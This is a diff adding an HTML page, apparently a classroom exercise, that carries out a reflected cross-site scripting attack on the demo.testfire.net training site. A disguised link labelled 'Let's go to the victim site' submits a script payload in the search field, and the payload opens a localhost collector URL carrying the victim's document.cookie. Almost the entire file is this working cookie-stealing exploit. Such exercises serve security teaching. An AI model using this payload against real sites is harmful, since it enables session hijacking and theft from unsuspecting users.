@@ -1,0 +1,26 @@
+<html>
+	<head>
+		<script>
+			function evilfn(e){
+				e.preventDefault(); // when you click, don't open it up
+				var frm=document.getElementById("frm");
+				var ip=document.createElement("input");
+				ip.type="text";
+				ip.name="txtSearch";
+				//var hackstr="<script>alert('Hello')<\/script>";
+				var hackstr="<script>window.open('http://localhost/class/7thNov/xssf.php?cookie="+document.cookie+"')<\/script>";
+				ip.value=hackstr;
+				frm.appendChild(ip);
+				frm.submit();
+
+			}
+		</script>
+	</head>
+	<body>
+		<form id="frm" action="http://demo.testfire.net/search.aspx"  method="get">
+			<a href="http://demo.testfire.net/search.aspx" onclick="evilfn(event)">
+			Let's go to the victim site
+		</a>
+		</form>
+	</body>
+</html>
